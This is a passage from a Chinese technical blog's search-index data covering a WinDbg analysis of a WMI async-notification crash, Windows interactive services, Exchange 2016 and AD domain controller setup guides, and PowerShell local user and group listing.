的使用问题","date":"2024-02-06T08:37:40.593Z","path":"A_OS/Windows/COM/【COM】异步通知的使用问题/","text":"概述：异步通知 IWbemServices::ExecNotificationQueryAsync 的使用问题。调用 CancelAsyncCall 之后导致程序崩溃。 代码参考微软官方示例：示例：通过 WMI 接收事件通知 - Win32 apps | Microsoft Learn 0x01 复现场景 环境：windows server 2008 参考微软官方代码实现一个进程，使用 windbg 加载进程，然后等待进程结束，就能看到 windbg 报错 0xC0000005。 0x02 dmp分析 报错详情 （调用 CancelAsyncCall 的进程）主要问题还是访问了空指针导致的，并且是 ecx。是类成员函数调用时出现异常。this 指针为空。 堆栈 确定是 RPC 调用。下一步查询下 RPC 调用方。 ole32!GetChannelCallMgr 函数原型： 12HRESULT GetChannelCallMgr(RPCOLEMESSAGE *pMsg, IUnknown * pStub, IUnknown *pServer, CRpcChannelBuffer::CServerCallMgr **ppStubBuffer) 直接看第一个参数 pMsg 。 查看下调用方 成员变量 reserverd1 保存了RPC相关信息。 先 dds 再 dt 查看其内容。 CAsyncCall 的成员可以查看 Windows-Server-2003&#x2F;com&#x2F;ole32&#x2F;com&#x2F;dcomrem&#x2F;call.hxx at 5c6fe3db626b63a384230a1aa6b92ac416b0765f · selfrender&#x2F;Windows-Server-2003 中相关源码。 成员变量 _hRPC 来自于其继承的父类 CMessageCall 1293 handle_t _hRpc; // Call handle (not binding handle). _hRpc 记录了调用方的句柄。查看 0x0479ba28 内存，在其附近找到了调用方的 PID 和 TID。如下图所示： 看下 PID 对应的进程，如下图所示： unsecapp 也就是我们注册的异步通知的通知方。 0x03 问题分析基本分析完 dmp 文件之后，可以确定是我们注册的异步通知在程序结束时被调用了，导致 unsecapp 通知过来之后，调用了空指针。 为什么会出现这种问题，可以看下 unsecapp 的堆栈，上边已经看到了具体的pid和tid，1b34.1b48, 这就直接看线程 1b38 的堆栈就可以了。 堆栈如下所示： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748 0 Id: 1b34.1b38 Suspend: 1 Teb: 7ffdf000 Unfrozen # ChildEBP RetAddr Args to Child 00 0018e8b0 773354ac 76d6a8b7 00000002 0018e904 ntdll!KiFastSystemCallRet (FPO: [0,0,0])01 0018e8b4 76d6a8b7 00000002 0018e904 00000001 ntdll!NtWaitForMultipleObjects+0xc (FPO: [5,0,0])02 0018e950 77420f8d 0018e904 0018e978 00000000 kernel32!WaitForMultipleObjectsEx+0x11d (FPO: [Non-Fpo])03 0018e9a4 76832507 0000002c 0018e9ec ffffffff USER32!RealMsgWaitForMultipleObjectsEx+0x13c (FPO: [Non-Fpo])04 0018e9cc 768325bc 0018e9ec ffffffff 0018e9fc ole32!CCliModalLoop::BlockFn+0x97 (FPO: [Non-Fpo]) (CONV: thiscall) [d:\\longhorn\\com\\ole32\\com\\dcomrem\\callctrl.cxx @ 1162] 05 0018e9f4 76938f62 ffffffff 002c27a0 0018eb00 ole32!ModalLoop+0x5b (FPO: [Non-Fpo]) (CONV: stdcall) [d:\\longhorn\\com\\ole32\\com\\dcomrem\\chancont.cxx @ 211] 06 0018ea10 76939ce1 00000000 0018eb14 00000000 ole32!ThreadSendReceive+0x12c (FPO: [Non-Fpo]) (CONV: stdcall) [d:\\longhorn\\com\\ole32\\com\\dcomrem\\channelb.cxx @ 4831] 07 0018ea38 76939b4d 0018eb00 002cf4d8 0018eb5c ole32!CRpcChannelBuffer::SwitchAptAndDispatchCall+0x194 (FPO: [Non-Fpo]) (CONV: thiscall) [d:\\longhorn\\com\\ole32\\com\\dcomrem\\channelb.cxx @ 4386] 08 0018eb18 76833f94 002cf4d8 0018ec40 0018ec24 ole32!CRpcChannelBuffer::SendReceive2+0xef (FPO: [Non-Fpo]) (CONV: stdcall) [d:\\longhorn\\com\\ole32\\com\\dcomrem\\channelb.cxx @ 4009] 09 0018eb34 76833f46 0018ec40 0018ec24 002cf4d8 ole32!CCliModalLoop::SendReceive+0x1e (FPO: [Non-Fpo]) (CONV: thiscall) [d:\\longhorn\\com\\ole32\\com\\dcomrem\\callctrl.cxx @ 849] 0a 0018ebac 76853811 002cf4d8 0018ec40 0018ec24 ole32!CAptRpcChnl::SendReceive+0x73 (FPO: [Non-Fpo]) (CONV: stdcall) [d:\\longhorn\\com\\ole32\\com\\dcomrem\\callctrl.cxx @ 578] 0b 0018ec00 7712074c 002cf4d8 0018ec40 0018ec24 ole32!CCtxComChnl::SendReceive+0x1c5 (FPO: [Non-Fpo]) (CONV: stdcall) [d:\\longhorn\\com\\ole32\\com\\dcomrem\\ctxchnl.cxx @ 734] 0c 0018ec18 771207ad 002a37bc 0018ecdc 771211b0 RPCRT4!NdrProxySendReceive+0x430d 0018ec24 771211b0 45542f97 0018f0d8 070001f3 RPCRT4!NdrpProxySendReceive+0xc (FPO: [0,0,0])0e 0018f09c 77120822 70b62ba8 70b621fc 0018f0d8 RPCRT4!NdrClientCall2+0x5e90f 0018f0c0 770aeb83 0018f0d8 00000004 0018f0f0 RPCRT4!ObjectStublessClient+0x6f10 0018f0d0 6fc1a87e 002a37bc 00000000 80041032 RPCRT4!ObjectStubless+0xf11 0018f0f0 004b2ec2 00eea0fc 00000000 80041032 fastprox!CSinkProxyBuffer::XSinkFacelet::SetStatus+0x2e (FPO: [Non-Fpo])12 0018f128 770b3419 00262914 00000000 80041032 unsecapp!CStub::SetStatus+0x7b (FPO: [Non-Fpo])13 0018f150 77121d35 004b2e47 0018f350 00000005 RPCRT4!Invoke+0x2a14 0018f180 771220a1 00000000 002aeb9c 002df118 RPCRT4!NdrStubCall2+0x28a (FPO: [SEH])15 0018f1c8 770b6e5f 76866918 70b62ba8 00000000 RPCRT4!NdrStubCall2+0x4ab (FPO: [SEH])16 0018f1cc 76866918 70b62ba8 00000000 00000000 RPCRT4!NdrpClientUnMarshal+0x464 (FPO: [SEH])17 0018f574 77122465 002d1e78 002cf658 002c31b8 ole32!NdrOleAllocate18 0018f5c4 6fc1a8b7 002d1e78 002c31b8 002cf658 RPCRT4!CStdStubBuffer_Invoke+0xa0 (FPO: [SEH])19 0018f5d8 7693a8c5 00eea174 002c31b8 002cf658 fastprox!CSinkStubBuffer::XSinkStublet::Invoke+0x36 (FPO: [Non-Fpo])1a 0018f620 7693aa59 002c31b8 002bd800 002b5eb0 ole32!SyncStubInvoke+0x3c (FPO: [Non-Fpo]) (CONV: stdcall) [d:\\longhorn\\com\\ole32\\com\\dcomrem\\channelb.cxx @ 1161] 1b 0018f66c 768661d6 002c31b8 002cfd60 00eea174 ole32!StubInvoke+0xb9 (FPO: [Non-Fpo]) (CONV: stdcall) [d:\\longhorn\\com\\ole32\\com\\dcomrem\\channelb.cxx @ 1372] 1c 0018f748 768660e7 002cf658 00000000 00eea174 ole32!CCtxComChnl::ContextInvoke+0xfa (FPO: [Non-Fpo]) (CONV: stdcall) [d:\\longhorn\\com\\ole32\\com\\dcomrem\\ctxchnl.cxx @ 1255] 1d 0018f764 76866df5 002c31b8 00000001 00eea174 ole32!MTAInvoke+0x1a (FPO: [Non-Fpo]) (CONV: stdcall) [d:\\longhorn\\com\\ole32\\com\\dcomrem\\callctrl.cxx @ 2020] 1e 0018f790 7693a981 002c31b8 00000001 00eea174 ole32!STAInvoke+0x46 (FPO: [Non-Fpo]) (CONV: stdcall) [d:\\longhorn\\com\\ole32\\com\\dcomrem\\callctrl.cxx @ 1839] 1f 0018f7c4 7693a79b d0908070 002cf658 00eea174 ole32!AppInvoke+0xaa (FPO: [Non-Fpo]) (CONV: stdcall) [d:\\longhorn\\com\\ole32\\com\\dcomrem\\channelb.cxx @ 1060] 20 0018f8a0 7693ae2d 002c3160 002abff0 00000400 ole32!ComInvokeWithLockAndIPID+0x32c (FPO: [Non-Fpo]) (CONV: stdcall) [d:\\longhorn\\com\\ole32\\com\\dcomrem\\channelb.cxx @ 1675] 21 0018f8c8 76866bcd 002c3160 00000400 0029cc10 ole32!ComInvoke+0xc5 (FPO: [Non-Fpo]) (CONV: stdcall) [d:\\longhorn\\com\\ole32\\com\\dcomrem\\channelb.cxx @ 1445] 22 0018f8dc 76866b8c 002c3160 0018f99c 00000400 ole32!ThreadDispatch+0x23 (FPO: [Non-Fpo]) (CONV: stdcall) [d:\\longhorn\\com\\ole32\\com\\dcomrem\\chancont.cxx @ 298] 23 0018f920 7741fd72 00c600f6 00000400 0000babe ole32!ThreadWndProc+0x167 (FPO: [Non-Fpo]) (CONV: stdcall) [d:\\longhorn\\com\\ole32\\com\\dcomrem\\chancont.cxx @ 654] 24 0018f94c 7741fe4a 76866aef 00c600f6 00000400 USER32!InternalCallWinProc+0x2325 0018f9c4 7742018d 00000000 76866aef 00c600f6 USER32!UserCallWinProcCheckWow+0x14b (FPO: [Non-Fpo])26 0018fa28 7742022b 76866aef 00000000 0018fa68 USER32!DispatchMessageWorker+0x322 (FPO: [Non-Fpo])27 0018fa38 004b4fd7 0018fa4c 71b6d20c 004b9118 USER32!DispatchMessageW+0xf (FPO: [Non-Fpo])28 0018fa68 004b6749 457c3509 004b954c 00000001 unsecapp!MessageLoop+0x28 (FPO: [Non-Fpo])29 0018fa98 004b41a2 00000002 00262228 002614a0 unsecapp!main+0x38c (FPO: [Non-Fpo])2a 0018fadc 76d6d411 7ffd7000 0018fb28 7731152f unsecapp!_initterm_e+0x163 (FPO: [Non-Fpo])2b 0018fae8 7731152f 7ffd7000 772f5944 00000000 kernel32!BaseThreadInitThunk+0xe (FPO: [Non-Fpo])2c 0018fb28 77311502 004b42dc 7ffd7000 ffffffff ntdll!__RtlUserThreadStart+0x23 (FPO: [Non-Fpo])2d 0018fb40 00000000 004b42dc 7ffd7000 00000000 ntdll!_RtlUserThreadStart+0x1b (FPO: [Non-Fpo]) 可以看到消息都是通过 DispatchMessageW 发送出去的。在后续rpc通知的时候，客户端可能已经调用了 CancelAsyncCall。当rpc执行的时候，就会出现崩溃问题。 0x04 解决方法在 CancelAsyncCall 方法之后让当前线程阻塞一点时间，等待上次 unsecapp rpc调用结束，再调用 release 释放 IWbemServices 等相关对象。 补充reserverd1 变量说明: 还是这个项目 selfrender&#x2F;Windows-Server-2003: This is the leaked source code of Windows Server 2003 先看一下 CMessageCall 作为 CAsyncCall 的父类是有哪些成员的： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144//-----------------------------------------------------------------//// Class: CMessageCall//// Purpose: This class adds a message to the call info. The// proxie&#x27;s message is copied so the call can be// canceled without stray pointer references.////-----------------------------------------------------------------class CMessageCall : public ICancelMethodCalls, public IMessageParam&#123;public: // Constructor and destructor CMessageCall();protected: virtual ~CMessageCall(); virtual void UninitCallObject();public: // called before a call starts and after a call completes. virtual HRESULT InitCallObject(CALLCATEGORY callcat, RPCOLEMESSAGE *message, DWORD flags, REFIPID ipidServer, DWORD destctx, COMVERSION version, CChannelHandle *handle); // IUnknown methods STDMETHOD(QueryInterface)(REFIID riid, LPVOID *ppv) = 0; STDMETHOD_(ULONG,AddRef)(void) = 0; STDMETHOD_(ULONG,Release)(void) = 0; // ICancelMethodCalls methods STDMETHOD(Cancel)(ULONG ulSeconds) = 0; STDMETHOD(TestCancel)(void) = 0; // Virtual methods needed by every call type for cancel support virtual void CallCompleted ( HRESULT hrRet ) = 0; virtual void CallFinished () = 0; virtual HRESULT CanDispatch () = 0; virtual HRESULT WOWMsgArrived () = 0; virtual HRESULT GetState ( DWORD *pdwState ) = 0; virtual BOOL IsCallDispatched() = 0; virtual BOOL IsCallCompleted () = 0; virtual BOOL IsCallCanceled () = 0; virtual BOOL IsCancelIssued () = 0; virtual BOOL HasWOWMsgArrived() = 0; virtual BOOL IsClientWaiting () = 0; virtual void AckCancel () = 0; virtual HRESULT Cancel (BOOL fModalLoop, ULONG ulTimeout) = 0; virtual HRESULT AdvCancel () = 0; virtual void Abort() &#123; Win4Assert(!&quot;Abort Called&quot;); &#125; // Query methods BOOL ClientAsync() &#123; return _iFlags &amp; CALLFLAG_CLIENTASYNC; &#125; BOOL ServerAsync() &#123; return _iFlags &amp; CALLFLAG_SERVERASYNC; &#125; BOOL CancelEnabled() &#123; return _iFlags &amp; CALLFLAG_CANCELENABLED; &#125; BOOL IsClientSide() &#123; return !(_iFlags &amp; server_cs); &#125; BOOL FakeAsync() &#123; return _iFlags &amp; fake_async_cs; &#125; BOOL FreeThreaded() &#123; return _iFlags &amp; freethreaded_cs; &#125; void Lock() &#123; _iFlags |= locked_cs; &#125;#if DBG == 1 void SetNAToMTAFlag() &#123;_iFlags |= leave_natomta_cs;&#125; void ResetNAToMTAFlag()&#123;_iFlags &amp;= ~leave_natomta_cs;&#125; BOOL IsNAToMTAFlagSet()&#123; return _iFlags &amp; leave_natomta_cs;&#125; void SetNAToSTAFlag() &#123;_iFlags |= leave_natosta_cs;&#125; void ResetNAToSTAFlag()&#123;_iFlags &amp;= ~leave_natosta_cs;&#125; BOOL IsNAToSTAFlagSet()&#123; return _iFlags &amp; leave_natosta_cs;&#125;#endif BOOL Locked() &#123; return _iFlags &amp; locked_cs; &#125; BOOL Neutral() &#123; return _iFlags &amp; neutral_cs; &#125; BOOL ProcessLocal() &#123; return _iFlags &amp; process_local_cs; &#125; BOOL ThreadLocal() &#123; return _iFlags &amp; thread_local_cs; &#125; BOOL Proxy() &#123; return _iFlags &amp; proxy_cs; &#125; BOOL Server() &#123; return _iFlags &amp; server_cs; &#125; // Get methods DWORD GetTimeout(); DWORD GetDestCtx() &#123; return _destObj.GetDestCtx(); &#125; COMVERSION &amp;GetComVersion() &#123; return _destObj.GetComVersion(); &#125; CCtxCall *GetClientCtxCall() &#123; return m_pClientCtxCall; &#125; CCtxCall *GetServerCtxCall() &#123; return m_pServerCtxCall; &#125; BOOL GetErrorFromPolicy() &#123; return (_iFlags &amp; CALLFLAG_ERRORFROMPOLICY); &#125; HRESULT SetCallerhWnd(); HWND GetCallerhWnd() &#123; return _hWndCaller; &#125; HANDLE GetEvent() &#123; return _hEvent; &#125; CALLCATEGORY GetCallCategory()&#123; return _callcat; &#125; HRESULT GetResult() &#123; return _hResult; &#125; void SetResult(HRESULT hr) &#123; _hResult = hr; &#125; DWORD GetFault() &#123; return _server_fault; &#125; void SetFault(DWORD fault) &#123; _server_fault = fault; &#125; IPID &amp; GetIPID() &#123; return _ipid; &#125; HANDLE GetSxsActCtx() &#123; return _hSxsActCtx; &#125; // Set methods void SetThreadLocal(BOOL fThreadLocal); void SetClientCtxCall(CCtxCall *pCtxCall) &#123; m_pClientCtxCall = pCtxCall; &#125; void SetServerCtxCall(CCtxCall *pCtxCall) &#123; m_pServerCtxCall = pCtxCall; &#125; void SetClientAsync() &#123; _iFlags |= CALLFLAG_CLIENTASYNC; &#125; void SetServerAsync() &#123; _iFlags |= CALLFLAG_SERVERASYNC; &#125; void SetCancelEnabled() &#123; _iFlags |= CALLFLAG_CANCELENABLED; &#125; void SetErrorFromPolicy() &#123; _iFlags |= CALLFLAG_ERRORFROMPOLICY; &#125; void ResetErrorFromPolicy() &#123; _iFlags &amp;= ~CALLFLAG_ERRORFROMPOLICY; &#125; void SetSxsActCtx(HANDLE hCtx); // Other methods HRESULT RslvCancel(DWORD &amp;dwSignal, HRESULT hrIn, BOOL fPostMsg, CCliModalLoop *pCML); protected: // Call object fields CALLCATEGORY _callcat; // call category DWORD _iFlags; // EChannelState SCODE _hResult; // HRESULT or exception code HANDLE _hEvent; // caller wait event HWND _hWndCaller;// caller apartment hWnd (only used InWow) IPID _ipid; // ipid of interface call is being made on HANDLE _hSxsActCtx;// Activation context active in the caller&#x27;s contextpublic: // Channel fields DWORD _server_fault; CDestObject _destObj; void *_pHeader; CChannelHandle *_pHandle; handle_t _hRpc; // Call handle (not binding handle). IUnknown *_pContext; // Structure RPCOLEMESSAGE message; SChannelHookCallInfo hook; DWORD _dwErrorBufSize;protected: // Cancel fields ULONG m_ulCancelTimeout; // Seconds to wait before canceling the call DWORD m_dwStartCount; // Tick count at the time the call was made CCtxCall *m_pClientCtxCall; // Client side context call object CCtxCall *m_pServerCtxCall; // Server side context call object&#125;; 134行 message 成员的结构体就是我们用来解析 reserved1 成员时使用的结构体。 可以使用 RPCOLEMESSAGE 的原因就是因为在 CAsyncCall 的另外一个函数中，当 RPC 服务端响应时，reserved1 被 _hRPC 赋值了。而 _hRpc 则是在rpc建立连接时绑定的（调用函数为 RpcBindingInqAuthInfoExW 函数 (rpcdce.h) - Win32 apps | Microsoft Learn）。 123456789101112131415inline void CAsyncCall::ServerReply()&#123; Win4Assert( _hRpc != NULL ); if (_hResult != S_OK) &#123; I_RpcAsyncAbortCall( &amp;_AsyncState, _hResult ); &#125; else &#123; // Ignore errors because replies can fail. message.reserved1 = _hRpc; I_RpcSend( (RPC_MESSAGE *) &amp;message ); &#125;&#125;","tags":[{"name":"COM","slug":"COM","permalink":"http://example.com/tags/COM/"},{"name":"RPC","slug":"RPC","permalink":"http://example.com/tags/RPC/"},{"name":"调试","slug":"调试","permalink":"http://example.com/tags/%E8%B0%83%E8%AF%95/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"http://example.com/categories/A-OS/Windows/"},{"name":"COM","slug":"A-OS/Windows/COM","permalink":"http://example.com/categories/A-OS/Windows/COM/"}]},{"title":"【服务】交互式服务","date":"2024-02-04T16:00:00.000Z","path":"A_OS/Windows/服务/【服务】交互式服务/","text":"概述：交互式服务是什么？ 参考链接： 交互式服务检测_百度百科 交互式服务 - Win32 apps | Microsoft Learn 0x01 说明交互式服务是windows的一个服务程序。 交互式服务检测是[Microsoft Windows](https://baike.baidu.com/item/Microsoft Windows&#x2F;0?fromModule&#x3D;lemma_inlink)对Windows Vista以前的交互式服务在Windows Vista及以后的操作系统中无法正常工作的问题（Session 0隔离）给出的应对方案。然而，此方案并不能较好的解决问题（需切换窗口站），故不建议使用在Windows Vista及以后的系统中使用交互式服务。 服务描述：启用交互服务需要用户输入时进行用户通知，这样，便可以在交互服务创建的对话框出现时访问这些对话框。如果停止此服务，则对新交互服务对话框的通知将无法正常运行，而且可能无法访问这些交互服务对话框。如果已禁用此服务，则不再有新的交互服务对话框通知，也无法访问这些对话框。 .gwfiiyqbeotj{zoom:67%;} 通俗简单的说就是，服务一般都是控制台应用程序，有时候可能需要与用户交互，由此设计了一个专门为在没有图形用户界面（GUI）的情况下可以实现交互的服务。而这个服务就是 UIDDetect ，也即 Interactive Services Detection。 ❗❗❗ 从 Windows Vista 起，服务无法直接与用户进行交互。因此，不应在新代码中使用标题为“使用交互服务”一节中提到的技术。 使用及注意事项参考微软关于交互式服务的描述文章即可。交互式服务 - Win32 apps | Microsoft Learn 如何关闭以下注册表项包含一个值 NoInteractiveServices，该值控制SERVICE_INTERACTIVE_PROCESS的效果： HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Windows NoInteractiveServices 值默认为 1，这意味着无论服务是否具有SERVICE_INTERACTIVE_PROCESS，都不允许以交互方式运行任何服务。 当 NoInteractiveServices 设置为 0 时，允许具有 SERVICE_INTERACTIVE_PROCESS 的服务以交互方式运行。","tags":[{"name":"系统服务","slug":"系统服务","permalink":"http://example.com/tags/%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1/"},{"name":"服务","slug":"服务","permalink":"http://example.com/tags/%E6%9C%8D%E5%8A%A1/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"http://example.com/categories/A-OS/Windows/"},{"name":"服务","slug":"A-OS/Windows/服务","permalink":"http://example.com/categories/A-OS/Windows/%E6%9C%8D%E5%8A%A1/"}]},{"title":"【环境搭建】Exchange Server 2016 CU21","date":"2024-02-02T05:49:50.778Z","path":"A_OS/Windows/环境搭建/Exchange-2016/","text":"概述：Exchange Server 2016 CU21安装和配置，安装 Exchange 需要目标服务器必须是 AD 域的成员。 Windows Server 2016 安装和配置参考 【环境搭建】windows Server 2016 AD域控搭建 下载MSDN, 我告诉你 - 做一个安静的工具站 在MSDN中下载对应的版本 安装一下依赖的组件：（参考https://docs.microsoft.com/zh-cn/exchange/plan-and-deploy/prerequisites?view=exchserver-2016） 1.NET Framework 4.8https://download.visualstudio.microsoft.com/download/pr/014120d7-d689-4305-befd-3cb711108212/0fd66638cde16859462a6243a4629a50/ndp48-x86-x64-allos-enu.exe 2.安装Visual C++ Redistributable Package for Visual Studio 2012https://www.microsoft.com/en-us/download/details.aspx?id=30679 3.Visual C++ 2013 Redistributable Packagehttps://support.microsoft.com/zh-cn/topic/update-for-visual-c-2013-redistributable-package-d8ccd6a5-4e26-c290-517b-8da6cfdf4f10 4.通过Power Shell安装Exchange必备的Windows组件 由于我们安装的 2016 版本，可以直接直接使用有安装向导的 Exchange 邮箱服务器。 参考 使用安装向导安装 Exchange 邮箱服务器 | Microsoft Learn 其他版本下载链接Exchange 2016 cu13 https://download.microsoft.com/download/5/9/6/59681DAE-AB62-4854-8DEC-CA25FFEFE3B3/ExchangeServer2016-x64-cu13.iso 安装准备务必安装以下几个模块： 安装 .Net FrameWork 4.8 下载链接：https://download.visualstudio.microsoft.com/download/pr/014120d7-d689-4305-befd-3cb711108212/0fd66638cde16859462a6243a4629a50/ndp48-x86-x64-allos-enu.exe 安装 KB3206632 下载链接：Microsoft Update Catalog 安装 Unified Communications Managed API 4.0 Runtime 下载链接：Download Unified Communications Managed API 4.0 Runtime from Official Microsoft Download Center 安装如有特殊需求，可不使用推荐设置，如无，则使用推荐设置更方便。 使用推荐设置直接安装即可。不使用推荐设置情况下基本与推荐设置一致。 服务器角色选择 安装空间和位置，默认 Exchange 组织，输入组织名称，可以勾选按照 AD拆分权限应用于 Exchange 组织（如果是在域控服务器上，则不可以勾选） 恶意软件防护设置，选择是否勾选，如果勾选，需要联网下载反恶意软件引擎。 准备情况检查，等待检查完成选择安装即可。 安装结束 配置默认安装完成后会有体验天数 邮箱管理登录页面：https://localhost/ecp 个人邮箱用户登录页面：https://localhost/owa 当然安装完成后也支持POP3，IMAP服务 详情在服务里面启动就可以进行配置 配置语言和时区 登录个人邮箱 选择是否开启 IMAP4、POP3","tags":[{"name":"windows","slug":"windows","permalink":"http://example.com/tags/windows/"},{"name":"环境搭建","slug":"环境搭建","permalink":"http://example.com/tags/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"},{"name":"exchange","slug":"exchange","permalink":"http://example.com/tags/exchange/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"http://example.com/categories/A-OS/Windows/"},{"name":"环境搭建","slug":"A-OS/Windows/环境搭建","permalink":"http://example.com/categories/A-OS/Windows/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"}]},{"title":"【环境搭建】windows Server 2016 AD域控搭建","date":"2024-02-02T01:47:12.077Z","path":"A_OS/Windows/环境搭建/域服务器/","text":"概述：windows server 2016 虚拟机安装及AD域控搭建 安装windows server 2016下载安装系统在 MSDN 找到 windows server 2016 下载，下载完成后创建 VM 虚拟机，安装 windows server 2016 系统。安装的时候选择带&#x3D;&#x3D;图形界面&#x3D;&#x3D;的。 MSDN网站： https://msdn.itellyou.cn/ 配置AD域环境 AD域相关文章： 【WINAPI】系统获取系统主机域名 【AD域】 安装 DNS 服务器 修改ip为静态ip 添加 DNS 服务器 开始之前 -&gt; 下一步 安装类型 -&gt; 下一步 服务器选择 -&gt; 下一步 服务器角色 功能 -&gt; 下一步 确认 -&gt; 安装 等待安装结束 安装 Active Directory 域服务 添加角色和功能 开始之前 -&gt; 下一步 安装类型 -&gt; 下一步 服务器选择 -&gt; 下一步 服务器角色 -&gt; Active Directory 域服务 添加角色功能向导 -&gt; 添加功能 服务器角色 -&gt; 下一步 功能 -&gt; 下一步 AD DS -&gt; 下一步 确认 最后等待安装完成即可。 配置 AD DS 安装完成后，点击右上角 更多 开始配置 将此服务器提升为域控制器 部署配置 -&gt; 添加新林 如果是公司的首台域控制器，选择“添加新林”，自定义公司的根域名，域名命令规则xxx.com，为什么要用.com结尾呢？一般来说.com注册用户为公司或企业。 域控制器选项 -&gt; 密码 -&gt; 下一步 新林和根域的功能级别，默认Windows Server 2016。 指定域控制器功能，域名系统（DNS）服务器，全局编录（GC）都是默认安装在此域控服务器上。 设置目录服务器叫还原模式（DSRM）密码。Directory Services Restore Mode，简称DSRM，又称目录服务恢复模式。是Windows域控制器的服务器安全模式启动选项。DSRM允许管理员用来修复或还原修复或重建活动目录数据库。 DNS 选项 -&gt; 下一步 其他选项 -&gt; 下一步 路径 AD DS数据库、日志文件和SYSVOL的文件存储的默认位置。 Ntds.dit：存储活动目录数据库文件，存储域控制器的所有活动目录对象。 Edb*.log：存储日志文件，默认日志文件Edb.log。 SYSVOL，它是用来存储域公共文件服务器副本的共享文件夹，例如我们用得最多的组策略设置、脚本等都是存在这个共享目录中的，script脚本文件，Netlogon共享文件，Sysvol共享文件。 查看选项 -&gt; 下一步 先决条件检查 -&gt; 安装 等待安装结果 安装结束，安装完成后需要重启","tags":[{"name":"windows","slug":"windows","permalink":"http://example.com/tags/windows/"},{"name":"AD","slug":"AD","permalink":"http://example.com/tags/AD/"},{"name":"环境搭建","slug":"环境搭建","permalink":"http://example.com/tags/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"http://example.com/categories/A-OS/Windows/"},{"name":"环境搭建","slug":"A-OS/Windows/环境搭建","permalink":"http://example.com/categories/A-OS/Windows/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"}]},{"title":"【Powershell】获取本地用户和组","date":"2024-01-23T16:00:00.000Z","path":"A_OS/Windows/cmd/【Powershell】获取本地用户和组/","text":"概述：在 Power Shell 中获取本地用户和组，以及组成员 获取本地相关的命令1234567891011121314151617181920212223242526PS C:\\Users\\holdy&gt; get-command -name *local*# 输出如下所示：# CommandType Name Version Source# ----------- ---- ------- ------# Function Enable-BCLocal 1.0.0.0 BranchCache# Function Get-DscLocalConfigurationManager 1.1 PSDesiredStateConfiguration# Cmdlet Add-LocalGroupMember 1.0.0.0 Microsoft.PowerShell.LocalAccounts# Cmdlet Disable-LocalUser 1.0.0.0 Microsoft.PowerShell.LocalAccounts# Cmdlet Enable-LocalUser 1.0.0.0 Microsoft.PowerShell.LocalAccounts# Cmdlet Get-LocalGroup 1.0.0.0 Microsoft.PowerShell.LocalAccounts# Cmdlet Get-LocalGroupMember 1.0.0.0 Microsoft.PowerShell.LocalAccounts# Cmdlet Get-LocalUser 1.0.0.0 Microsoft.PowerShell.LocalAccounts# Cmdlet Get-WinSystemLocale 2.1.0.0 International# Cmdlet Import-LocalizedData 3.1.0.0 Microsoft.PowerShell.Utility# Cmdlet New-LocalGroup 1.0.0.0 Microsoft.PowerShell.LocalAccounts# Cmdlet New-LocalUser 1.0.0.0 Microsoft.PowerShell.LocalAccounts# Cmdlet Remove-LocalGroup 1.0.0.0 Microsoft.PowerShell.LocalAccounts# Cmdlet Remove-LocalGroupMember 1.0.0.0 Microsoft.PowerShell.LocalAccounts# Cmdlet Remove-LocalUser 1.0.0.0 Microsoft.PowerShell.LocalAccounts# Cmdlet Rename-LocalGroup 1.0.0.0 Microsoft.PowerShell.LocalAccounts# Cmdlet Rename-LocalUser 1.0.0.0 Microsoft.PowerShell.LocalAccounts# Cmdlet Set-DscLocalConfigurationManager 1.1 PSDesiredStateConfiguration# Cmdlet Set-LocalGroup 1.0.0.0 Microsoft.PowerShell.LocalAccounts# Cmdlet Set-LocalUser 1.0.0.0 Microsoft.PowerShell.LocalAccounts# Cmdlet Set-WinSystemLocale 2.1.0.0 International 获取本地用户12345678910111213PS C:\\Users\\holdy&gt; Get-LocalUser# Name Enabled Description# ---- ------- -----------# Administrator False 管理计算机(域)的内置帐户# DefaultAccount False 系统管理的用户帐户。# defaultuser100001 True# Guest False 供来宾访问计算机或访问域的内置帐户# holdy True# localtest True# localtestEmpty True# localtestEmpty1 True# WDAGUtilityAccount False 系统为 Windows Defender 应用程序防护方案管理和使用的用户帐户。 获取本地管理员组12345PS C:\\Users\\holdy&gt; Get-LocalGroup Administrators# Name Description# ---- -----------# Administrators 管理员对计算机/域有不受限制的完全访问权 获取本地管理员组成员123456PS C:\\Users\\holdy&gt; Get-LocalGroupMember Administrators# ObjectClass Name PrincipalSource# ----------- ---- ---------------# 用户 MONTARIUS-WIN11\\Administrator Local# 用户 MONTARIUS-WIN11\\holdy MicrosoftAccount 获取本地用户组12345PS C:\\Users\\holdy&gt; Get-LocalGroup users# Name Description# ---- -----------# Users 防止用户进行有意或无意的系统范围的更改，但是可以运行大部分应用程序 获取本地用户组成员12345678910PS C:\\Users\\holdy&gt; Get-LocalGroupMember users# ObjectClass Name PrincipalSource# ----------- ---- ---------------# 用户 MONTARIUS-WIN11\\holdy MicrosoftAccount# 用户 MONTARIUS-WIN11\\localtest Local# 用户 MONTARIUS-WIN11\\localtestEmpty Local# 用户 MONTARIUS-WIN11\\localtestEmpty1 Local# 组 NT AUTHORITY\\Authenticated Users Unknown# 组 NT AUTHORITY\\INTERACTIVE 